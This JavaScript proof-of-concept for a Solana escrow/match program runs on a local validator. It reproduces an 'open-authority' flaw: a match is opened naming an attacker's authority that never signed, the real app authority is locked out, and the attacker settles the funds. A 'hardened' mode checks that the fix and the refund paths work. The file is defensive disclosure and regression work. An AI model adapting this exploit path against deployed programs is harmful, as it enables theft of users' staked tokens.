/**
 * Localnet proof for the open-authority gap.
 * `reproduce` expects the current program to store an authority that never signed.
 * `hardened` expects that substitution to be rejected, and the deadline refund to remain.
 * This talks only to 127.0.0.1. It does not touch the public Devnet program.
 */
import {
  ASSOCIATED_TOKEN_PROGRAM_ID,
  TOKEN_PROGRAM_ID,
  createMint,
  getAccount,
  getAssociatedTokenAddressSync,
  getOrCreateAssociatedTokenAccount,
  mintTo,
} from "@solana/spl-token";
import {
  Connection,
  Keypair,
  PublicKey,
  SYSVAR_CLOCK_PUBKEY,
  SystemProgram,
  Transaction,
  TransactionInstruction,
  sendAndConfirmTransaction,
} from "@solana/web3.js";

const mode = process.argv[2] === "hardened" ? "hardened" : "reproduce";
const PROGRAM_ID = new PublicKey("HUkhJi8p1XXuErpEXkgpfQjwdapigXLECRoQSu3indyS");
const connection = new Connection("http://127.0.0.1:8899", "confirmed");
const STAKE = 1_000_000n;

function u64(value) {
  const buf = Buffer.alloc(8);
  buf.writeBigUInt64LE(value);
  return buf;
}
function i64(value) {
  const buf = Buffer.alloc(8);
  buf.writeBigInt64LE(value);
  return buf;
}

async function unixNow() {
  const info = await connection.getAccountInfo(SYSVAR_CLOCK_PUBKEY);
  return info.data.readBigInt64LE(32);
}

async function send(signers, ix) {
  const tx = new Transaction().add(ix);
  return sendAndConfirmTransaction(connection, tx, signers);
}

function openIx({ id, pda, bump, mint, token, vault, player, authority, authoritySigns, joinBy, settleBy }) {
  return new TransactionInstruction({
    programId: PROGRAM_ID,
    keys: [
      { pubkey: pda, isSigner: false, isWritable: true },
      { pubkey: mint, isSigner: false, isWritable: false },
      { pubkey: token, isSigner: false, isWritable: true },
      { pubkey: vault, isSigner: false, isWritable: true },
      { pubkey: player, isSigner: true, isWritable: true },
      { pubkey: authority, isSigner: authoritySigns, isWritable: false },
      { pubkey: TOKEN_PROGRAM_ID, isSigner: false, isWritable: false },
      { pubkey: ASSOCIATED_TOKEN_PROGRAM_ID, isSigner: false, isWritable: false },
      { pubkey: SystemProgram.programId, isSigner: false, isWritable: false },
    ],
    data: Buffer.concat([Buffer.from([0]), u64(id), u64(STAKE), i64(joinBy), i64(settleBy), Buffer.from([bump])]),
  });
}

async function freshAccounts() {
  const player = Keypair.generate();
  const other = Keypair.generate();
  const appAuthority = Keypair.generate();
  const attacker = Keypair.generate();
  const mintAuthority = Keypair.generate();
  for (const payer of [player, other, appAuthority, attacker, mintAuthority]) {
    const sig = await connection.requestAirdrop(payer.publicKey, 2_000_000_000);
    await connection.confirmTransaction(sig, "confirmed");
  }
  const mint = await createMint(connection, mintAuthority, mintAuthority.publicKey, null, 6);
  const token = (await getOrCreateAssociatedTokenAccount(connection, player, mint, player.publicKey)).address;
  const otherToken = (await getOrCreateAssociatedTokenAccount(connection, other, mint, other.publicKey)).address;
  await mintTo(connection, mintAuthority, mint, token, mintAuthority, 5_000_000n);
  await mintTo(connection, mintAuthority, mint, otherToken, mintAuthority, 5_000_000n);
  return { player, other, appAuthority, attacker, mint, token, otherToken };
}

function matchOf(id) {
  const idBuf = u64(id);
  const [pda, bump] = PublicKey.findProgramAddressSync([Buffer.from("match"), idBuf], PROGRAM_ID);
  return { pda, bump };
}

async function main() {
  const health = await fetch("http://127.0.0.1:8899", {
    method: "POST",
    headers: { "content-type": "application/json" },
    body: JSON.stringify({ jsonrpc: "2.0", id: 1, method: "getHealth" }),
  });
  if (!health.ok) throw new Error("Localnet is not up");
  const { player, other, appAuthority, attacker, mint, token, otherToken } = await freshAccounts();
  const report = { mode, attackLanded: false, attackError: "", appSettleRejected: false, attackerSettled: false, mismatchRejected: false, earlyCancelRejected: false, deadlineRefund: false };
  let now = await unixNow();

  const hijackId = BigInt(Date.now());
  const hijack = matchOf(hijackId);
  const hijackVault = getAssociatedTokenAddressSync(mint, hijack.pda, true);
  let attackError = "";
  try {
    await send(
      [player],
      openIx({
        id: hijackId,
        ...hijack,
        mint,
        token,
        vault: hijackVault,
        player: player.publicKey,
        authority: attacker.publicKey,
        authoritySigns: false,
        joinBy: now + 600n,
        settleBy: now + 1200n,
      }),
    );
    const account = await connection.getAccountInfo(hijack.pda);
    const stored = new PublicKey(account.data.subarray(8, 40));
    report.attackLanded = stored.equals(attacker.publicKey);
  } catch (error) {
    const logs = error && typeof error === "object" && "logs" in error && Array.isArray(error.logs) ? error.logs.join(" ") : "";
    attackError = `${error instanceof Error ? error.message : String(error)} ${logs}`;
    report.attackError = attackError.slice(0, 240);
  }

  if (mode === "reproduce" && !report.attackLanded) throw new Error(`Substitution did not land: ${attackError}`);
  if (mode === "hardened" && report.attackLanded) throw new Error("Hardened program still stored an unsigned authority");
  if (mode === "hardened" && !/signature/i.test(attackError)) {
    throw new Error(`Hardened rejection was not a missing signature: ${attackError}`);
  }

  if (report.attackLanded) {
    const otherVault = hijackVault;
    await send([other], new TransactionInstruction({
      programId: PROGRAM_ID,
      keys: [
        { pubkey: hijack.pda, isSigner: false, isWritable: true },
        { pubkey: mint, isSigner: false, isWritable: false },
        { pubkey: otherToken, isSigner: false, isWritable: true },
        { pubkey: otherVault, isSigner: false, isWritable: true },
        { pubkey: other.publicKey, isSigner: true, isWritable: false },
        { pubkey: TOKEN_PROGRAM_ID, isSigner: false, isWritable: false },
      ],
      data: Buffer.from([1]),
    }));
    const settleKeys = [
      { pubkey: hijack.pda, isSigner: false, isWritable: true },
      { pubkey: mint, isSigner: false, isWritable: false },
      { pubkey: hijackVault, isSigner: false, isWritable: true },
      { pubkey: token, isSigner: false, isWritable: true },
      { pubkey: otherToken, isSigner: false, isWritable: true },
      { pubkey: appAuthority.publicKey, isSigner: true, isWritable: false },
      { pubkey: TOKEN_PROGRAM_ID, isSigner: false, isWritable: false },
    ];
    try {
      await send([appAuthority], new TransactionInstruction({ programId: PROGRAM_ID, keys: settleKeys, data: Buffer.from([2, 1]) }));
    } catch {
      report.appSettleRejected = true;
    }
    settleKeys[5] = { pubkey: attacker.publicKey, isSigner: true, isWritable: false };
    await send([attacker], new TransactionInstruction({ programId: PROGRAM_ID, keys: settleKeys, data: Buffer.from([2, 1]) }));
    report.attackerSettled = (await getAccount(connection, token)).amount === 6_000_000n;
  }

  now = await unixNow();
  const badId = hijackId + 1n;
  const bad = matchOf(badId);
  const badVault = getAssociatedTokenAddressSync(mint, bad.pda, true);
  try {
    await send(
      [player],
      openIx({
        id: badId,
        ...bad,
        mint,
        token: otherToken,
        vault: badVault,
        player: player.publicKey,
        authority: appAuthority.publicKey,
        authoritySigns: false,
        joinBy: now + 600n,
        settleBy: now + 1200n,
      }),
    );
  } catch {
    report.mismatchRejected = true;
  }

  now = await unixNow();
  const refundId = hijackId + 2n;
  const refund = matchOf(refundId);
  const refundVault = getAssociatedTokenAddressSync(mint, refund.pda, true);
  const before = (await getAccount(connection, token)).amount;
  const openSigners = mode === "hardened" ? [player, appAuthority] : [player];
  await send(
    openSigners,
    openIx({
      id: refundId,
      ...refund,
      mint,
      token,
      vault: refundVault,
      player: player.publicKey,
      authority: appAuthority.publicKey,
      authoritySigns: mode === "hardened",
      joinBy: now + 4n,
      settleBy: now + 600n,
    }),
  );
  const cancelIx = new TransactionInstruction({
    programId: PROGRAM_ID,
    keys: [
      { pubkey: refund.pda, isSigner: false, isWritable: true },
      { pubkey: mint, isSigner: false, isWritable: false },
      { pubkey: refundVault, isSigner: false, isWritable: true },
      { pubkey: token, isSigner: false, isWritable: true },
      { pubkey: token, isSigner: false, isWritable: true },
      { pubkey: player.publicKey, isSigner: true, isWritable: false },
      { pubkey: TOKEN_PROGRAM_ID, isSigner: false, isWritable: false },
    ],
    data: Buffer.from([3]),
  });
  try {
    await send([player], cancelIx);
  } catch {
    report.earlyCancelRejected = true;
  }
  await new Promise((resolve) => setTimeout(resolve, 5000));
  await send([player], cancelIx);
  const after = (await getAccount(connection, token)).amount;
  report.deadlineRefund = after === before;
  await send([player], cancelIx);
  report.secondCancelKeptBalance = (await getAccount(connection, token)).amount === after;

  if (!report.mismatchRejected || !report.earlyCancelRejected || !report.deadlineRefund || !report.secondCancelKeptBalance) {
    throw new Error(`Negative checks failed ${JSON.stringify(report)}`);
  }
  if (mode === "reproduce" && (!report.appSettleRejected || !report.attackerSettled)) {
    throw new Error(`Exploit path incomplete ${JSON.stringify(report)}`);
  }
  console.log(JSON.stringify(report));
}

main().catch((error) => {
  console.error(error instanceof Error ? error.message : error);
  process.exit(1);
});
